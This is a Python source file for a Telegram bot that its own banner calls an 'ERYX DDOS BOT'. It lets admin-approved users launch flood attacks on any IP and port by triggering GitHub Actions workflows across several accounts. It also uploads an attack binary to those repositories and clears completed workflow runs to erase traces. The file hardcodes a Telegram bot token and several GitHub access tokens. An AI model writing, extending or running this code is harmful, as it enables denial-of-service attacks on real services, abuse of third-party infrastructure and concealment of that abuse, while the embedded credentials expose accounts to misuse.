import time
import asyncio
import aiohttp
import base64
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup

TELEGRAM_TOKEN = "8242844757:AAEal7ZGHJO6Zvhr9kovdgp9vFerc5CPhlo"
ADMIN_ID = 8549583525
SECOND_ADMIN_ID = 8595518118

user_upload_states = {}
user_delete_states = {}
user_addtoken_states = {}

ACCOUNTS = [
    {
        'token': 'ghp_orrTVl9xJxWPCeOwt4qKdIBRo4630fqyh',
        'repos': ['mrxytkn-ctrl/Making']
    },
    {
        'token': 'ghp_00afwfSnpZDUpDGpsswbugOtohpT04xP7I',
        'repos': ['vampr574/silvepotato']
    },
    {
        'token': 'ghp_rbYfT2FrE1ZgnscxQ0TTameserg2REXMZ',
        'repos': ['ibaru8276/fanttic-carnival']
    }
]

def get_all_repos():
    repos = []
    idx = 1
    for acc in ACCOUNTS:
        for repo in acc['repos']:
            repos.append({'index': idx, 'token': acc['token'], 'repo': repo})
            idx += 1
    return repos

approved_users = {}
is_attack_running = False
attack_end_time = 0
current_target = ""
user_states = {}

def is_admin(user_id: int):
    return user_id == ADMIN_ID or user_id == SECOND_ADMIN_ID

def is_approved(user_id: int):
    if user_id in approved_users:
        return time.time() < approved_users[user_id]['expiry_time']
    return False

def approve_user(user_id: int, days: int):
    expiry_time = time.time() + (days * 86400)
    approved_users[user_id] = {'expiry_time': expiry_time, 'approved_days': days}

approve_user(ADMIN_ID, 36500)
approve_user(SECOND_ADMIN_ID, 36500)

async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove <user_id>")
        return
    try:
        user_id = int(context.args[0])
        if user_id == ADMIN_ID or user_id == SECOND_ADMIN_ID:
            await update.message.reply_text("❌ Cannot remove admin.")
            return
        if user_id in approved_users:
            del approved_users[user_id]
            await update.message.reply_text(f"✅ USER REMOVED!\n🆔 {user_id}")
        else:
            await update.message.reply_text("❌ User not found.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")

async def fire_workflow_async(session, token, repo, params):
    try:
        url = f"https://api.github.com/repos/{repo}/actions/workflows/main.yml/dispatches"
        headers = {
            "Authorization": f"Bearer {token}",
            "Accept": "application/vnd.github.v3+json",
            "Content-Type": "application/json"
        }
        async with session.post(url, headers=headers, json=params, timeout=5) as response:
            return response.status == 204
    except:
        return False

async def trigger_all_workflows_async(ip, port, duration, threads):
    success_count = 0
    async with aiohttp.ClientSession() as session:
        for account in ACCOUNTS:
            token = account['token']
            repo = account['repos'][0]
            params = {
                "ref": "main",
                "inputs": {
                    "ip": str(ip),
                    "port": str(port),
                    "duration": str(duration + 10),
                    "threads": str(threads)
                }
            }
            success = await fire_workflow_async(session, token, repo, params)
            if success:
                success_count += 1
    return success_count

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome = """
🚀 𝔼ℝ𝕐𝕏 𝕌𝕃𝕋𝐑𝔸 ℙ𝕆𝕎𝔼𝐑 𝔻𝔻𝕆𝐒 🚀

🎯 COMMANDS:
/Myid - Check User ID
/attack <ip> <port> <time> <threads>
/approve <user_id> <days> (Admin)
/remove <user_id> (Main Admin Only)

📁 FILE MANAGER:
/upload - Upload files to repository
/deletefile - Delete files from repository
/repostatus - Check all repositories status

🧹 WORKFLOW MANAGER:
/clearhistory - Delete completed workflow runs only

🔧 TOKEN MANAGER:
/addtoken <token> <repo_url> - Add new token + repo
/listtokens - Show all tokens
/removetoken <number> - Remove token

👑 OWNER: @SpicyEryx ✅
    """
    await update.message.reply_text(welcome)
    
    keyboard = [
        ["🔹 My ID", "🚀 Attack"],
        ["🧹 Clear History", "📊 Repo Status"],
        ["🗑️ Delete File", "📤 Upload File"]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
    await update.message.reply_text("👇 USE BUTTONS BELOW 👇", reply_markup=reply_markup)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if text == "🔹 My ID":
        await Myid(update, context)
    elif text == "🚀 Attack":
        if not is_approved(user_id):
            await update.message.reply_text("❌ Not approved.")
            return
        if is_attack_running:
            remaining = attack_end_time - time.time()
            if remaining > 0:
                await update.message.reply_text(f"⏳ Cooldown: {int(remaining//60)}m {int(remaining%60)}s remaining")
                return
        user_states[user_id] = "waiting_for_attack"
        await update.message.reply_text("Type 👉: <ip> <port> <time> <threads>")
    elif text == "🧹 Clear History":
        await clearhistory(update, context)
    elif text == "📊 Repo Status":
        await repostatus(update, context)
    elif text == "🗑️ Delete File":
        await deletefile(update, context)
    elif text == "📤 Upload File":
        await upload(update, context)
    elif user_id in user_states and user_states[user_id] == "waiting_for_attack":
        await process_attack_input(update, context, text)
    elif user_id in user_upload_states and user_upload_states[user_id].get('step') in ['waiting_file', 'waiting_numbers']:
        await handle_file_upload(update, context)
    elif user_id in user_delete_states and user_delete_states[user_id].get('step') in ['confirm_delete', 'waiting_numbers']:
        await handle_delete_confirmation(update, context, text)
    elif user_id in user_addtoken_states and user_addtoken_states[user_id].get('step') == 'waiting_group':
        await handle_addtoken_group(update, context, text)
    else:
        keyboard = [
            ["🔹 My ID", "🚀 Attack"],
            ["🧹 Clear History", "📊 Repo Status"],
            ["🗑️ Delete File", "📤 Upload File"]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
        await update.message.reply_text("Use buttons below:", reply_markup=reply_markup)

async def process_attack_input(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    global is_attack_running, attack_end_time, current_target
    user_id = update.effective_user.id
    if user_id in user_states:
        del user_states[user_id]
    parts = text.split()
    if len(parts) != 4:
        await update.message.reply_text("❌ Invalid format. Need: <ip> <port> <time> <threads>")
        return
    try:
        ip, port, time_int, threads = parts[0], parts[1], int(parts[2]), int(parts[3])
        if time_int < 10 or time_int > 300:
            await update.message.reply_text("❌ Time: 10-300 seconds")
            return
        if threads < 10 or threads > 900:
            await update.message.reply_text("❌ Threads: 10-900")
            return
    except ValueError:
        await update.message.reply_text("❌ Invalid numbers.")
        return
    is_attack_running = True
    attack_end_time = time.time() + time_int + 10
    current_target = f"{ip}:{port}"
    attack_msg = f"""
🚀 𝐄𝐑𝐘𝐗 𝐕𝐈𝐏 𝐃𝐃𝐎𝐒 🚀

🚀 ATTACK BY: @SpicyEryx
🎯 TARGET: {ip}
🔌 PORT: {port}
⏰ TIME: {time_int}s
🧵 THREADS: {threads}

📞 TARGET: TELEGRAM VC
    """
    await update.message.reply_text(attack_msg)
    asyncio.create_task(execute_attack(update, ip, port, time_int, threads))
    await asyncio.sleep(10)
    await update.message.reply_text("🔥 Attack Processing Start 🔥")

async def Myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    username = update.effective_user.username
    if is_approved(user_id):
        expiry_time = approved_users[user_id]['expiry_time']
        approved_days = approved_users[user_id]['approved_days']
        expiry_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(expiry_time))
        remaining = expiry_time - time.time()
        remaining_days = int(remaining // 86400)
        remaining_hours = int((remaining % 86400) // 3600)
        approval_status = f"✅ APPROVED USER\n📅 {approved_days} days\n⏰ {expiry_str}\n🕒 {remaining_days}d {remaining_hours}h"
    else:
        approval_status = "❌ NOT APPROVED"
    user_info = f"👤 USER INFO:\n🆔 {user_id}\n📛 {first_name}\n🔗 @{username if username else 'N/A'}\n\n{approval_status}"
    await update.message.reply_text(user_info)

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /approve <user_id> <days>")
        return
    try:
        user_id, days = int(context.args[0]), int(context.args[1])
        if days < 1 or days > 30:
            await update.message.reply_text("❌ Days: 1-30 only.")
            return
        approve_user(user_id, days)
        await update.message.reply_text(f"✅ USER APPROVED!\n🆔 {user_id}\n📅 {days} days")
    except ValueError:
        await update.message.reply_text("❌ Invalid numbers.")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⚠️ Use the Attack button instead.")

async def execute_attack(update, ip, port, duration, threads):
    global is_attack_running, current_target
    try:
        triggered = await trigger_all_workflows_async(ip, port, duration, threads)
        await asyncio.sleep(duration + 10)
        await update.message.reply_text("✅ ATTACK COMPLETED! 🎯")
    except Exception as e:
        await update.message.reply_text(f"❌ Attack error: {e}")
    finally:
        is_attack_running = False
        current_target = ""

def get_headers(token):
    return {"Authorization": f"Bearer {token}", "Accept": "application/vnd.github.v3+json"}

async def upload_file_to_repo(token, repo, filename, content, is_binary=False):
    try:
        headers = get_headers(token)
        
        if filename == "main.yml":
            filepath = ".github/workflows/main.yml"
        else:
            filepath = filename
            
        url = f"https://api.github.com/repos/{repo}/contents/{filepath}"
        
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://api.github.com/repos/{repo}", headers=headers) as repo_check:
                if repo_check.status != 200:
                    return False, f"Repo access failed: {repo_check.status}"
            
            async with session.get(url, headers=headers) as resp:
                sha = None
                if resp.status == 200:
                    data = await resp.json()
                    sha = data.get('sha')
            
            if is_binary:
                encoded = base64.b64encode(content).decode('utf-8')
            else:
                text_content = content.decode('utf-8')
                encoded = base64.b64encode(text_content.encode('utf-8')).decode('utf-8')
            
            data = {
                "message": f"Upload {filename}",
                "content": encoded
            }
            if sha:
                data["sha"] = sha
            
            async with session.put(url, headers=headers, json=data) as put_resp:
                if put_resp.status in [200, 201]:
                    return True, "✅ Uploaded"
                else:
                    return False, f"Upload failed: {put_resp.status}"
    except Exception as e:
        return False, f"Exception: {str(e)}"

async def delete_file_from_repo(token, repo, filename):
    try:
        headers = get_headers(token)
        
        if filename == "main.yml":
            filepath = ".github/workflows/main.yml"
        else:
            filepath = filename
            
        url = f"https://api.github.com/repos/{repo}/contents/{filepath}"
        
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://api.github.com/repos/{repo}", headers=headers) as repo_check:
                if repo_check.status != 200:
                    return False, f"Repo access failed: {repo_check.status}"
            
            async with session.get(url, headers=headers) as resp:
                if resp.status != 200:
                    if resp.status == 404:
                        return False, "File not found"
                    else:
                        return False, f"File check failed: {resp.status}"
                data = await resp.json()
                sha = data.get('sha')
                if not sha:
                    return False, "No SHA found"
            
            del_data = {"message": f"Delete {filename}", "sha": sha}
            async with session.delete(url, headers=headers, json=del_data) as del_resp:
                if del_resp.status == 200:
                    return True, "Deleted"
                else:
                    return False, f"Delete failed: {del_resp.status}"
    except Exception as e:
        return False, str(e)

async def upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only.")
        return
    user_id = update.effective_user.id
    keyboard = [
        [InlineKeyboardButton("⚡ MRX Binary", callback_data="ufile_mrx")],
        [InlineKeyboardButton("🐍 main.py", callback_data="ufile_main")],
        [InlineKeyboardButton("⚙️ main.yml", callback_data="ufile_yml")],
        [InlineKeyboardButton("❌ Cancel", callback_data="ufile_cancel")]
    ]
    user_upload_states[user_id] = {'step': 'select_type'}
    await update.message.reply_text("📁 Kis type ki file upload karni hai?", reply_markup=InlineKeyboardMarkup(keyboard))

async def deletefile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only.")
        return
    user_id = update.effective_user.id
    keyboard = [
        [InlineKeyboardButton("⚡ MRX Binary", callback_data="dfile_mrx")],
        [InlineKeyboardButton("🐍 main.py", callback_data="dfile_main")],
        [InlineKeyboardButton("⚙️ main.yml", callback_data="dfile_yml")],
        [InlineKeyboardButton("❌ Cancel", callback_data="dfile_cancel")]
    ]
    user_delete_states[user_id] = {'step': 'select_type'}
    await update.message.reply_text("🗑️ Kaun si file delete karni hai?", reply_markup=InlineKeyboardMarkup(keyboard))

async def addtoken(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only.")
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /addtoken <token> <repo_url>")
        return
    
    token = context.args[0]
    repo_url = context.args[1]
    repo = repo_url.replace('https://github.com/', '').replace('.git', '')
    
    for acc in ACCOUNTS:
        if acc['token'] == token:
            await update.message.reply_text("❌ This token already exists!")
            return
        if repo in acc['repos']:
            await update.message.reply_text("❌ This repository already exists with another token!")
            return
    
    user_id = update.effective_user.id
    user_addtoken_states[user_id] = {
        'step': 'waiting_confirm',
        'token': token,
        'repo': repo
    }
    
    keyboard = [
        [InlineKeyboardButton("✅ Confirm Add", callback_data="addtoken_confirm")],
        [InlineKeyboardButton("❌ Cancel", callback_data="addtoken_cancel")]
    ]
    await update.message.reply_text(
        f"🔑 Token: {token[:10]}...\n📁 Repo: {repo}\n\n✅ Confirm add?",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def handle_addtoken_group(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    pass

async def listtokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only.")
        return
    
    text = "📋 GITHUB ACCOUNTS\n\n"
    for i, acc in enumerate(ACCOUNTS, 1):
        token_preview = acc['token'][:10] + "..."
        text += f"{i}. 🔑 {token_preview}\n"
        for repo in acc['repos']:
            text += f"   📁 {repo}\n"
    
    text += f"\n📊 Total accounts: {len(ACCOUNTS)}"
    await update.message.reply_text(text)

async def removetoken(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /removetoken <number>\nUse /listtokens to see numbers.")
        return
    try:
        num = int(context.args[0]) - 1
        if 0 <= num < len(ACCOUNTS):
            account = ACCOUNTS[num]
            token_preview = account['token'][:10] + "..."
            repo_name = account['repos'][0]
            ACCOUNTS.pop(num)
            await update.message.reply_text(f"✅ Token {token_preview} ({repo_name}) removed!")
        else:
            await update.message.reply_text("❌ Invalid number")
    except:
        await update.message.reply_text("❌ Invalid number")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data
    
    if data.startswith("ufile_"):
        file_type = data.replace("ufile_", "")
        if file_type == "cancel":
            user_upload_states.pop(user_id, None)
            await query.edit_message_text("❌ Upload cancelled.")
            return
        filename_map = {'mrx': ('mrx', True), 'main': ('main.py', False), 'yml': ('main.yml', False)}
        filename, is_binary = filename_map[file_type]
        repos = get_all_repos()
        repo_list = "\n".join([f"{r['index']}. {r['repo']}" for r in repos])
        user_upload_states[user_id] = {'step': 'waiting_numbers', 'filename': filename, 'is_binary': is_binary}
        await query.edit_message_text(f"📁 Repository numbers do (comma separated):\n\n{repo_list}\n\nExample: 1,2,3")
    
    elif data.startswith("dfile_"):
        file_type = data.replace("dfile_", "")
        if file_type == "cancel":
            user_delete_states.pop(user_id, None)
            await query.edit_message_text("❌ Delete cancelled.")
            return
        filename_map = {'mrx': 'mrx', 'main': 'main.py', 'yml': 'main.yml'}
        filename = filename_map[file_type]
        repos = get_all_repos()
        repo_list = "\n".join([f"{r['index']}. {r['repo']}" for r in repos])
        user_delete_states[user_id] = {'step': 'waiting_numbers', 'filename': filename}
        await query.edit_message_text(f"🗑️ Repository numbers do (comma separated) for DELETE:\n\n{repo_list}\n\nExample: 1,2,3")
    
    elif data.startswith("addtoken_"):
        if data == "addtoken_cancel":
            user_addtoken_states.pop(user_id, None)
            await query.edit_message_text("❌ Token add cancelled.")
            return
        
        state = user_addtoken_states.get(user_id)
        if not state:
            await query.edit_message_text("❌ Session expired. Start over with /addtoken")
            return
        
        if data == "addtoken_confirm":
            ACCOUNTS.append({'token': state['token'], 'repos': [state['repo']]})
            user_addtoken_states.pop(user_id, None)
            await query.edit_message_text(
                f"✅ Token added successfully!\n"
                f"📁 Repo: {state['repo']}\n"
                f"📊 Total accounts: {len(ACCOUNTS)}"
            )
        else:
            await query.edit_message_text("❌ Invalid option")

async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    state = user_upload_states.get(user_id)
    if not state:
        return
    if state.get('step') == 'waiting_numbers' and update.message.text:
        try:
            numbers = [int(x.strip()) for x in update.message.text.split(',')]
            all_repos = get_all_repos()
            selected = [r for r in all_repos if r['index'] in numbers]
            if not selected:
                await update.message.reply_text("❌ No valid repos")
                return
            state['selected_repos'] = selected
            state['step'] = 'waiting_file'
            repo_names = "\n".join([r['repo'] for r in selected])
            await update.message.reply_text(
                f"📤 Ab {state['filename']} file send karo.\n"
                f"✅ Selected {len(selected)} repositories:\n{repo_names}"
            )
        except:
            await update.message.reply_text("❌ Invalid format. Send numbers like: 1,2,3")
    elif state.get('step') == 'waiting_file' and update.message.document:
        filename = state['filename']
        is_binary = state['is_binary']
        selected = state['selected_repos']
        file = update.message.document
        msg = await update.message.reply_text(f"⏳ Uploading to {len(selected)} repos...")
        
        async def upload_task():
            new_file = await context.bot.get_file(file.file_id)
            data = await new_file.download_as_bytearray()
            success = 0
            failed = []
            for repo in selected:
                ok, error = await upload_file_to_repo(repo['token'], repo['repo'], filename, data, is_binary)
                if ok:
                    success += 1
                else:
                    failed.append(f"{repo['repo']}: {error}")
            result = f"✅ Uploaded {success}/{len(selected)}"
            if failed:
                result += f"\n❌ Failed:\n" + "\n".join(failed[:3])
            await msg.edit_text(result)
            user_upload_states.pop(user_id, None)
        
        asyncio.create_task(upload_task())

async def handle_delete_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    user_id = update.effective_user.id
    state = user_delete_states.get(user_id)
    if not state:
        return
    if state.get('step') == 'waiting_numbers':
        try:
            numbers = [int(x.strip()) for x in text.split(',')]
            all_repos = get_all_repos()
            selected = [r for r in all_repos if r['index'] in numbers]
            if not selected:
                await update.message.reply_text("❌ No valid repos")
                return
            state['selected_repos'] = selected
            state['step'] = 'confirm_delete'
            repo_names = "\n".join([r['repo'] for r in selected])
            await update.message.reply_text(
                f"🗑️ Confirm delete?\nFile: {state['filename']}\nRepos:\n{repo_names}\n\nType YES to confirm or NO to cancel"
            )
        except:
            await update.message.reply_text("❌ Invalid format. Send numbers like: 1,2,3")
    elif state.get('step') == 'confirm_delete' and text.upper() == 'YES':
        selected = state['selected_repos']
        filename = state['filename']
        msg = await update.message.reply_text(f"⏳ Deleting from {len(selected)} repos...")
        success = 0
        failed = []
        for repo in selected:
            ok, message = await delete_file_from_repo(repo['token'], repo['repo'], filename)
            if ok:
                success += 1
            else:
                failed.append(f"{repo['repo']}: {message}")
        result = f"✅ Deleted {success}/{len(selected)}"
        if failed:
            result += f"\n❌ Failed:\n" + "\n".join(failed[:3])
        await msg.edit_text(result)
        user_delete_states.pop(user_id, None)
    elif text.upper() == 'NO':
        await update.message.reply_text("❌ Delete cancelled.")
        user_delete_states.pop(user_id, None)

async def repostatus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only.")
        return
    msg = await update.message.reply_text("🔍 Checking repository status...")
    report = "📊 REPOSITORY STATUS\n\n"
    
    for acc in ACCOUNTS:
        token_preview = acc['token'][:8] + "..."
        for repo in acc['repos']:
            try:
                async with aiohttp.ClientSession() as s:
                    async with s.get(f"https://api.github.com/repos/{repo}", headers=get_headers(acc['token'])) as r:
                        if r.status == 200:
                            report += f"✅ {repo} ({token_preview})\n"
                        else:
                            report += f"❌ {repo} ({token_preview}) - Status: {r.status}\n"
            except:
                report += f"❌ {repo} ({token_preview}) - Error\n"
    
    await msg.edit_text(report)

async def delete_completed_workflows():
    total = 0
    for acc in ACCOUNTS:
        for repo in acc['repos']:
            try:
                headers = get_headers(acc['token'])
                url = f"https://api.github.com/repos/{repo}/actions/runs"
                async with aiohttp.ClientSession() as s:
                    async with s.get(url, headers=headers) as r:
                        if r.status == 200:
                            data = await r.json()
                            for run in data.get('workflow_runs', []):
                                if run.get('status') == 'completed':
                                    del_url = f"{url}/{run['id']}"
                                    async with s.delete(del_url, headers=headers) as del_resp:
                                        if del_resp.status in [204, 202]:
                                            total += 1
            except:
                continue
    return total

async def clearhistory(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only.")
        return
    msg = await update.message.reply_text("🧹 Clearing completed workflow history...")
    try:
        deleted = await delete_completed_workflows()
        await msg.edit_text(f"✅ Cleared {deleted} completed workflow runs.\n🏃 Running workflows are safe.")
    except Exception as e:
        await msg.edit_text(f"❌ Error: {e}")

def main():
    print("""
    ╔══════════════════════════════════════════════╗
    ║    🚀 ERYX DDOS BOT STARTING...              ║
    ║    Commands: /attack, /Myid, /approve       ║
    ║    /remove, /upload, /deletefile            ║
    ║    /repostatus, /clearhistory               ║
    ║    /addtoken, /listtokens, /removetoken     ║
    ║    Owner: @SpicyEryx                          ║
    ╚══════════════════════════════════════════════╝
    """)
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("Myid", Myid))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("remove", remove))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("upload", upload))
    app.add_handler(CommandHandler("deletefile", deletefile))
    app.add_handler(CommandHandler("repostatus", repostatus))
    app.add_handler(CommandHandler("clearhistory", clearhistory))
    app.add_handler(CommandHandler("addtoken", addtoken))
    app.add_handler(CommandHandler("listtokens", listtokens))
    app.add_handler(CommandHandler("removetoken", removetoken))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file_upload))
    app.add_handler(CallbackQueryHandler(button_callback))
    print("✅ Bot started successfully!")
    app.run_polling()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped")
    except Exception as e:
        print(f"⚠️ Error: {e}")
        time.sleep(5)
        main()
